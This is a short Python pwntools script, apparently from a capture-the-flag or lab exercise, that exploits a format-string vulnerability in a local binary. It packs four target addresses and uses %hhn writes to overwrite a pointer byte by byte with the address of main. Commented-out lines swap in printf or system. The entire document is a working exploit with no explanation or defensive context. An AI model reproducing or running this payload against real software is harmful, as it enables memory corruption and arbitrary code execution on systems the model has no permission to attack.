from pwn import *

context.log_level = 'debug'
p = process('./a')

main_entry = 0x80483c0
printf_entry = 0xf75f5020
system_entry = 0xf75e6940
target_addr = 0x0804a024

cb = main_entry
#cb = printf_entry
#cb = system_entry
a3 = (cb >> 24) & 0xff
a2 = (cb >> 16) & 0xff
a1 = (cb >> 8) & 0xff
a0 = cb & 0xff

print 'a0 - 16 = ' + hex(a0-16)
print 'a1 - a0 = ' + hex(a1-a0)
print 'a2 - a1 = ' + hex(a2-a1)
print 'a3 - a2 = ' + hex(a3-a2)

payload = p32(target_addr) + p32(target_addr+1) + p32(target_addr+2) + p32(target_addr+3)
'''
payload += '%' + str((a0-16) % 0x100) + 'x%11$hhn'
payload += '%' + str((a1-a0) % 0x100) + 'x%12$hhn'
payload += '%' + str((a2-a1) % 0x100) + 'x%13$hhn'
payload += '%' + str((a3-a2) % 0x100) + 'x%14$hhn'
'''
payload += '%' + str(a0-16) + 'x%11$hhn'
payload += '%' + str(0x100+(a1-a0)) + 'x%12$hhn'
payload += '%' + str(0x100+(a2-a1)) + 'x%13$hhn'
payload += '%' + str(0x100+(a3-a2)) + 'x%14$hhn'


p.sendline(payload)
print p.recv(4096)
